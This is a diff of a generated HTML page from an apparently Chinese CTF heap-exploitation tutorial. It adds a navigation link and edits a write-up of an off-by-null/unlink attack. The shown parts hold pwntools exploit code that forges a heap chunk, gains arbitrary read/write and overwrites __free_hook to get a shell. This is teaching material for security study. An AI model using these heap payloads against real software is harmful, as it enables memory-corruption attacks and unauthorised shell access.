@@ -753,6 +753,18 @@
   </li>
 
         
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../extend%26overlapping/" title="Chunk Extend and Overlapping" class="md-nav__link">
+      Chunk Extend and Overlapping
+    </a>
+  </li>
+
+        
       </ul>
     </nav>
   </li>
@@ -1509,7 +1521,7 @@ create(0x20,&quot;/bin/sh\x00&quot;,0x200,'k'*8)#6
 </code></pre>
 
 <p><strong>chunk4</strong></p>
-<p>chunk4 desc 用来伪造 fd、bk；被修改后的结构体用来修改 chunk6 的指针，形成一个任意读写。</p>
+<p>chunk4 desc 用来伪造 fd、bk；被修改后的结构体用来修改 chunk6  desc 的指针，形成一个任意读写。</p>
 <p>chunk4 申请的时候注意要用到 next_chunk 的 prev_size 位，方便我们伪造。</p>
 <p><strong>chunk5</strong></p>
 <p>chunk5 desc 需要 size （含chunk head）最低两个字节为 0x01 ，利用 off-by-null 覆盖为 0x00 ，prev_inuse 标记前面一个 chunk 是未使用的。如果申请出来的 size 不符合标准（eg：0x10），free 的时候会报错：</p>
@@ -1520,7 +1532,7 @@ create(0x20,&quot;/bin/sh\x00&quot;,0x200,'k'*8)#6
 <p><strong>chunk6</strong></p>
 <p>用来修改 __free_hook 。如果使用 system 将 book name 写入为 /bin/sh 就行了；使用 one_gadget 不需要。</p>
 <h6 id="chunk4">在 chunk4 内伪造一个堆</h6>
-<p>用的是现代 unlink 实现的效果是： *ptr = ptr-0x18 。</p>
+<p>用的是<strong>现代 unlink</strong> 实现的效果是： *ptr = ptr-0x18 。</p>
 <pre><code class="python">ptr = heap_base + 0x1180# target addr
 log.info(&quot;ptr:&quot;+hex(ptr))
 payload = p64(0)+p64(0x201)+ p64(ptr-0x18) + p64(ptr-0x10) 
@@ -1604,21 +1616,25 @@ create(0x20,'e'*8,0x20,'f'*8)#3
 remove(2)
 remove(3)
 
-create(0x20,'g'*8,0x208,'h'*8)#4
+
+create(0x20,'g'*8,0x208,'h'*8)#4 0x218
 # make sure chunk5size low bit is 01,or corruption (!prev)
-create(0x20,'i'*8,0x200-0x10,'j'*8)#5
+create(0x20,'i'*8,0x200-0x10,'j'*8)#5 0x200
 create(0x20,&quot;/bin/sh\x00&quot;,0x200,'k'*8)#6
 
 ptr = heap_base + 0x1180# target addr
 log.info(&quot;ptr:&quot;+hex(ptr))
+# fake chunk(0x200 2 chunk5)
 payload = p64(0)+p64(0x201)+ p64(ptr-0x18) + p64(ptr-0x10) 
 payload += '\x00'*0x1e0+p64(0x200)
 edit(4,payload)
+# gdb.attach(p,&quot;b *$rebase(0x202018)&quot;)
 remove(5)# unlink *ptr = ptr-0x18
 
+# FD-&gt;chunk4 desc fd 
+# BK-&gt;chunk6 struct desc
 payload = p64(0x31)+p64(0x4)+p64(heap_base+0x11e0)+p64(heap_base+0x10c0)
 edit(4,payload)
-
 show()
 p.recvuntil(&quot;Name: &quot;)
 p.recvuntil(&quot;Name: &quot;)
@@ -1639,7 +1655,7 @@ edit(6,payload)
 
 remove(6)
 
-#gdb.attach(p,&quot;b *$rebase(0x202018)&quot;)
+
 p.interactive()
 </code></pre>
 
@@ -1716,13 +1732,13 @@ p.interactive()
           </a>
         
         
-          <a href="../../linker/statically_linked/" title="静态链接程序利用" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../extend%26overlapping/" title="Chunk Extend and Overlapping" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-footer-nav__title">
               <div class="md-ellipsis">
                 <span class="md-footer-nav__direction">
                   下一页
                 </span>
-                静态链接程序利用
+                Chunk Extend and Overlapping
               </div>
             </div>
             <div class="md-footer-nav__button md-icon">
